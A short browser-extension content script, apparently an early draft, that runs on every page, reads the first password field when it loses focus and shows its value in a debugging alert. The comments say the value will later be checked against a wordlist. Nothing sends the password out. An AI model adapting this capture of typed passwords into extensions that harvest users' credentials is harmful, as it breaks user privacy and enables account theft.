// This is a content script that runs on all webpages visited by the user.
function passwordGrab(){
	// Locate input fields with type "password". Stores list of fields as a static NodeList object
	var password = document.querySelectorAll('input[type=password]');
	// Adds a listener on the first occurrence of a password field that triggers when field loses focus. This is intended to trigger on user clicking on submit button for login form.
	password[0].addEventListener("focusout",alertContent);
	// Debugging function to create alert box with content of password field. Used to verify code is working as intended. Field content will later be compared against wordlist.
	function alertContent(){
		alert(password[0].value);
	}
}
passwordGrab();